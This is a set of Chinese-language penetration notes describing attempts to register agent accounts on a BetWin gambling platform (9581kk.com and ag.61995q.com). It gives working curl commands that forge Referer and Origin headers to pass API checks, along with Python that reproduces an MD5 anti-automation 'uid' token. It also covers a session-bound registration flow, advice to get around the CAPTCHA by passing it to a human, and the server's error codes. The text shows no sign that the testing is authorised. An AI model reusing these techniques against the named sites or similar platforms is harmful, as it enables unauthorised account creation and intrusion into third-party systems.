# ag.61995q.com + 9581kk.com — BetWin 代理注册渗透纪要（第二轮）

> 日期：2026-07-13 晚
> 方法：从 9581kk.com 注册入口，尝试获取代理账号并登录 ag.61995q.com

## 架构确认

```
注册站: 9581kk.com  (会员/代理注册入口)
登录站: ag.61995q.com  (代理登录/后台管理)
共享后端数据库 ✅ （同一套 BetWin CMS）
```

## 关键突破：Server.GetCompany 需要 Referer/Origin 头

之前所有调用 `Server.GetCompany` 都返回 416，原因是缺少 HTTP Referer 和 Origin 头。

### 失败 vs 成功对比

```bash
# ❌ 失败：无 Referer/Origin
curl -sk -X POST -d "website=9581kk.com" \
  "https://9581kk.com/api/Public/main/index.php?service=Server.GetCompany"
# → {"ret":416, "msg":"请求的website不存在！"}

# ✅ 成功：带上 Referer + Origin + X-Requested-With
curl -sk -X POST \
  -H "Referer: https://9581kk.com/m/regagent" \
  -H "Origin: https://9581kk.com" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "website=9581kk.com" \
  "https://9581kk.com/api/Public/main/index.php?service=Server.GetCompany"
```

### GetCompany 返回数据

```json
{"ret":200,"data":{"id":"125771","account":"2Zy9PFAF",
  "client_id":"2e00195a7eff0cfb5ee4c2a8ebbe070200518814",
  "client_ip":"207.168.55.31","code":"b8","name":"必赢",
  "ver":202107101859}}
```

### website 参数规律

- `_PUBLIC_.website` 由 JS 运行时设为 `location.host`
- 9581kk.com 有效值：**`9581kk.com`**（不含端口）
- ag.61995q.com:7777 则返回 416（未在数据库注册）

## 代理注册 API: User.RegAgent

| 元素 | 路径 |
|:-----|:------|
| 注册页面 | `https://9581kk.com/m/regagent` |
| 注册 JS | `/m/static/default/latest/js/regagent.js` |
| API 端点 | `POST /api/Public/main/index.php?service=User.RegAgent` |
| 验证码 | `GET /api/Public/main/authCode.php?entry=1&client_id=xxx` |

### 参数列表

agentid, username, password, uname, code, client_id, mobile, email, qq, wx, dy, password2, bankid, account, website, ip

### 服务端额外要求字段

`safe_pwd` — 返回 code:407 "取款密码格式错误"。CDN 上 JS 版本不包含此字段，但服务端已要求。

### `uid` MD5 校验参数

**关键发现**：`User.RegAgent` 和 `User.Register` 都要求 `uid` 参数，值为 `MD5(password + username + client_id + website + ip)`。缺少此参数时返回 `"抱歉，注册失败，请更新最新版本！ERROR:2"`。

```python
import hashlib
raw = password + username + client_id + website + ip
uid = hashlib.md5(raw.encode()).hexdigest()
# 示例 raw: "Test1234hackmaster012e00195a7eff0cfb5ee4c2a8ebbe0702005188149581kk.com207.168.55.31"
```

这是服务端防自动化的关键校验——curl 请求缺少 uid 时服务端认为"版本过旧"而拒绝。

### 业务错误码

| code | 含义 |
|:-----|:------|
| 0 | 注册成功 |
| 407 | 取款密码格式错误 |
| 888 | 需要回答安全问题 |
| 999 | 验证码错误 |
| 416 | 验证码不存在或已失效 |

## 验证码特征

- 41×20 GIF，纯色块（图像不显示实际验证码数字，全是同色像素）
- **字母数字混合**（如 3AhT, crxf, kqey, hc52）— 不是纯数字
- **Session 绑定**：获取验证码的 session 必须在提交注册时使用同一 session
- 用户手动查看验证码后需**立即**提交（有效期数秒）

## Session 绑定流程

```bash
# 1. 获取 session
curl -sk -c sess.txt "https://target.com/" -o /dev/null
# 2. 获取验证码
curl -sk -b sess.txt -c sess.txt -H "Referer:..." "https://target.com/...authCode.php?..."
# 3. 提取 session 值并提交
SESS=$(grep -v "^#" sess.txt | grep -v "^$" | awk '{print $NF}')
curl -sk -b "Example_Session=$SESS" -H "Referer:..." -d "..." "https://target.com/...User.RegAgent"
```

## 关键教训

1. BetWin API 校验 Referer/Origin 头 — 不带就 416
2. CDN 上的 JS 可能落后于服务端 — safe_pwd 字段在 JS 中不存在但服务端要求
3. **`uid` 参数是 MD5 防自动化校验** — 缺少时返回"请更新最新版本"
4. 验证码时效极短、纯色图像、字母数字混合 — 不要 OCR，直接发给用户
5. 注册站和登录站可能不同域名但共享数据库
